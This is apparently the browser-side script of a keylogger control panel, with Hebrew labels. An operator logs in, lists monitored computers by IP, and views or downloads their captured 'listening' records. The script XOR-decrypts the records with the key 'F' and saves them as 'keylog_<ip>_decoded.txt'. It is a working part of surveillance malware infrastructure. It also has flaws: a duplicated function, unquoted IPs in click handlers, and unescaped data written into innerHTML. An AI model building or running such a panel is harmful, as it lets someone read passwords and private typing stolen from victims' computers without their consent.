const API_URL = 'http://localhost:5000/api';

let computers = [];
document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('login-form');
    const dashboardPage = document.getElementById('dashboard-page');
    const user = document.getElementById('user-name');
    const deshboardContent = document.getElementById('dashboard-content');
    const search = document.getElementById('search');
    const computersTable = document.getElementById('computers-list');   


    loginForm.addEventListener('submit',async (event) => {
        event.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
    
    try {
        const response = await fetch(`${API_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username,
                password
            })
        });
        const data = await response.json();
        if (data.success) {
            localStorage.setItem('username', data.username);
            dashboardPage.style.display = 'block';
            loginForm.style.display = 'none';
            user.innerText = data.username;
            updateComputersList();
        } else{
            alert("שם משתמש או סיסמה שגויים");
        }
    } catch (error) {
        console.error("שגיאת התחברות",error);
        alert("שגיאת התחברות");
    }
});


if (search) {
    search.addEventListener('input', searchComputers);
    }
});



async function addComputer() {
    const name = document.getElementById('name').value;
    const ip = document.getElementById('ip').value;
    
    const response = await fetch(`${API_URL}/computers`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            name,
            ip
        })
    });

    const data = await response.json();
    if (data.success === false) {
        alert(data.massge);
        return;
    }
    

    updateComputersList();

    document.getElementById('name').value = '';
    document.getElementById('ip').value = '';

}





async function removeComputer(ip) {
    const response = await fetch(`${API_URL}/computers/${ip}`, {
        method: 'DELETE'
    });

    await response.json();
    updateComputersList();
}


async function updateComputersList() {
    const response = await fetch(`${API_URL}/computers`);
    computers = await response.json();

    const tableBody = document.getElementById('computers-list');
    tableBody.innerHTML = '';


    computers.forEach(computer => {

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status}</td>
            <td>${computer.lastActivity}</td>
            <td>
                <button onclick="removeComputer(${computer.ip})">מחק</button>
                <button onclick="showMonitoring(${computer.ip})">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}


async function showMonitoring(ip) {

    const response = await fetch(`${API_URL}/computers/${ip}`);
    const computer = await response.json();
    
    // עדכון התוכן של לוח המחוונים
    const dashboardContent = document.getElementById('dashboard-content');
    dashboardContent.innerHTML = `
        <div class="computer-details">
            <h2>פרטי מחשב: ${computer.name}</h2>
            <div class="details-container">
                <p><strong>IP:</strong> ${computer.ip}</p>
                <p><strong>סטטוס:</strong></p>
                <p><strong>פעילות אחרונה:</strong> ${computer.lastActivity}</p>
                <p><strong>נתוני האזנה:</strong> ${computer.data ? 'זמינים' : 'לא זמינים'}</p>
                ${computer.data ? `<p><strong>עדכון אחרון:</strong> ${computer.last_modified}</p>` : ''}
            </div>
            
            <div class="actions-container">
                <button onclick="updateComputersList()">חזרה לרשימה</button>
                ${computer.data ? 
                    `<button onclick="showListeningData('${computer.ip}')">צפה בנתוני האזנה</button>
                     <button onclick="downloadListeningData('${computer.ip}')">הורד קובץ האזנה</button>` : 
                    ''}
            </div>
        </div>
    `;
} 

async function showListeningData(ip) {
    const response = await fetch(`${API_URL}/listening/${ip}`);
    const data = await response.json();

    const computer = computers.find(computer => computer.ip === ip);
    const computerName = computer.name;


    const dashboardContent = document.getElementById('dashboard-content');

    let contentHTML = '<ul>';
    for (const item of data) {
        contentHTML += `<li>${JSON.stringify(item)}</li>`;
    }
    contentHTML += '</ul>';

    dashboardContent.innerHTML = `
        <div class="listening-data">
            <h2>נתוני האזנה של מחשב: ${computerName}</h2>
            <div class="data-actions">
                <button onclick="updateComputersList()">חזרה לרשימה</button>
                <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
            </div>
            <div class="data-content">
                ${contentHTML}
            </div>
        </div>
    `;
}


function searchComputers() {
    const searchValue = search.value.toLowerCase();
    const filteredComputers = computers.filter(computer =>{
        return computer.name.includes(searchValue) ||
         computer.ip.includes(searchValue);
});

    const tableBody = document.getElementById('computers-list');
    tableBody.innerHTML = '';

    filteredComputers.forEach(computer => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${computer.name}</td>
            <td>${computer.ip}</td>
            <td>${computer.status}</td>
            <td>${computer.lastActivity}</td>
            <td>
                <button onclick="removeComputer(${computer.ip})">מחק</button>
                <button onclick="showMonitoring(${computer.ip})">מעקב</button>
                <button onclick="showListeningData('${computer.ip}')" ${!computer.data ? 'disabled' : ''}>צפה בהאזנות</button>
            </td>
        `;
        tableBody.appendChild(tr);
    });
}








// עדכון לקובץ javaScript.js

// פונקציה לפענוח תוכן מוצפן בצד הלקוח (אופציונלי - אפשר לעשות את זה בצד שרת)
function decryptData(encryptedData, key = "F") {
    let decrypted = '';
    for(let i = 0; i < encryptedData.length; i++) {
        const charCode = encryptedData.charCodeAt(i) ^ key.charCodeAt(0);
        decrypted += String.fromCharCode(charCode % 256);
    }
    return decrypted;
}

// פונקציה מעודכנת להצגת נתוני האזנה
async function showListeningData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        if (!response.ok) {
            throw new Error('Failed to fetch listening data');
        }
        
        const data = await response.json();
        const computer = computers.find(computer => computer.ip === ip);
        const computerName = computer ? computer.name : 'Unknown';

        const dashboardContent = document.getElementById('dashboard-content');
        
        // המרת הנתונים למבנה מסודר יותר
        let contentHTML = '<div class="listening-records">';
        
        // בדיקה אם הנתונים הם מערך או אובייקט
        if (Array.isArray(data)) {
            // מערך של רשומות
            for (const record of data) {
                contentHTML += formatListeningRecord(record);
            }
        } else {
            // אובייקט עם timestamps כמפתחות
            for (const timestamp in data) {
                contentHTML += `<div class="timestamp-header">${timestamp}</div>`;
                contentHTML += formatListeningRecord(data[timestamp]);
            }
        }
        
        contentHTML += '</div>';

        dashboardContent.innerHTML = `
            <div class="listening-data">
                <h2>נתוני האזנה של מחשב: ${computerName}</h2>
                <div class="data-actions">
                    <button onclick="updateComputersList()">חזרה לרשימה</button>
                    <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
                    <button onclick="downloadDecodedData('${ip}')">הורד נתונים מפוענחים</button>
                </div>
                <div class="data-content">
                    ${contentHTML}
                </div>
            </div>
        `;
    } catch (error) {
        console.error("שגיאה בטעינת נתוני האזנה:", error);
        alert("שגיאה בטעינת נתוני האזנה");
    }
}

// פונקציית עזר לפירמוט רשומת האזנה
function formatListeningRecord(record) {
    if (Array.isArray(record)) {
        // נסה לפענח את המידע המוצפן ולהציגו בצורה קריאה
        try {
            const decrypted = record.map(char => decryptData(char)).join('');
            return `<div class="listening-entry">
                <div class="raw-data" style="display:none">${JSON.stringify(record)}</div>
                <div class="decrypted-data">${decrypted}</div>
            </div>`;
        } catch (e) {
            return `<div class="listening-entry error">שגיאה בפענוח: ${e.message}</div>`;
        }
    } else if (typeof record === 'object') {
        let html = '<div class="listening-entry">';
        for (const key in record) {
            html += `<div><strong>${key}:</strong> ${JSON.stringify(record[key])}</div>`;
        }
        html += '</div>';
        return html;
    } else {
        return `<div class="listening-entry">${record}</div>`;
    }
}

// פונקציה להורדת הנתונים המפוענחים
async function downloadDecodedData(ip) {
    try {
        const response = await fetch(`${API_URL}/listening/${ip}`);
        const data = await response.json();
        
        // המרת הנתונים לטקסט מפוענח
        let decodedText = '';
        
        if (Array.isArray(data)) {
            for (const record of data) {
                decodedText += processRecordForDownload(record) + '\n\n';
            }
        } else {
            for (const timestamp in data) {
                decodedText += `=== ${timestamp} ===\n`;
                decodedText += processRecordForDownload(data[timestamp]) + '\n\n';
            }
        }
        
        // יצירת קובץ להורדה
        const blob = new Blob([decodedText], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `keylog_${ip}_decoded.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    } catch (error) {
        console.error("שגיאה בהורדת נתונים:", error);
        alert("שגיאה בהורדת נתונים");
    }
}

// פונקציית עזר להכנת רשומה להורדה
function processRecordForDownload(record) {
    if (Array.isArray(record)) {
        return record.map(char => decryptData(char)).join('');
    } else if (typeof record === 'object') {
        let text = '';
        for (const key in record) {
            text += `${key}: ${JSON.stringify(record[key])}\n`;
        }
        return text;
    } else {
        return String(record);
    }
}